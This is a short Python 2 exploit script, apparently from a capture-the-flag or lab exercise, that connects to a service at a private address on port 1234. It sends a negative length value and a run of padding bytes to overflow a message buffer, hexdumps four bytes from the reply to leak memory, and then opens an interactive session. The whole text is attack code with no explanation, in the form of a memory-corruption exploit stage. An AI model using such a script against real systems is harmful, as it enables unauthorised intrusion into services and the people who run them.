from PwnIOI import *


s = IOI(['192.168.0.85',1234])
s.read_until('name :')
s.write('name\n')
s.read_until('length :')
s.write('-1')
s.read_until('message :')
s.write('A'*(0x2C))
print hexdump.hexdump(s.read_until('Change')[0x3a:0x3a+4])
s.interact()
